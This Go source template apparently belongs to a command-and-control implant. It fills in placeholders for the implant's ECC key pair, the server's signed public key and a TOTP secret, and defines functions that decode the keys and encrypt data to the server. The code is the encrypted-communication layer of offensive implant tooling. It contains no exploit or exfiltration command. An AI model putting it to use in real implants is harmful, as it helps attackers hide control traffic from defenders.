package cryptography

import "encoding/base64"

var (
	// ECCPublicKey - The implant's ECC public key
	eccPublicKey = "{{.Config.ECCPublicKey}}"
	// eccPrivateKey - The implant's ECC private key
	eccPrivateKey = "{{.Config.ECCPrivateKey}}"
	// eccPublicKeySignature - The implant's signed ECC key by the server using Ed25519
	eccPublicKeySignature = "{{.Config.ECCPublicKeySignature}}"
	// eccServerPublicKey - Server's ECC public key
	eccServerPublicKey = "{{.Config.ECCServerPublicKey}}"

	// TOTP secret value
	totpSecret = "{{.OTPSecret}}"
)

// GetECCKeyPair - Get the implant's key pair
func GetECCKeyPair() *ECCKeyPair {
	publicRaw, _ := base64.RawStdEncoding.DecodeString(eccPublicKey)
	var public [32]byte
	copy(public[:], publicRaw)
	privateRaw, _ := base64.RawStdEncoding.DecodeString(eccPrivateKey)
	var private [32]byte
	copy(private[:], privateRaw)
	return &ECCKeyPair{
		Public:  &public,
		Private: &private,
	}
}

// GetServerPublicKey - Get the decoded server public key
func GetServerPublicKey() *[32]byte {
	publicRaw, _ := base64.RawStdEncoding.DecodeString(eccServerPublicKey)
	var public [32]byte
	copy(public[:], publicRaw)
	return &public
}

// ECCEncryptToServer - Encrypt using the server's public key
func ECCEncryptToServer(plaintext []byte) ([]byte, error) {
	recipientPublicKey := GetServerPublicKey()
	keyPair := GetECCKeyPair()
	ciphertext, err := ECCEncrypt(recipientPublicKey, keyPair.Private, plaintext)
	if err != nil {
		return nil, err
	}
	msg := make([]byte, len(keyPair.Public), len(keyPair.Public)+len(ciphertext))
	copy(msg, keyPair.Public[:])
	copy(msg[len(keyPair.Public):], ciphertext)
	return msg, nil
}
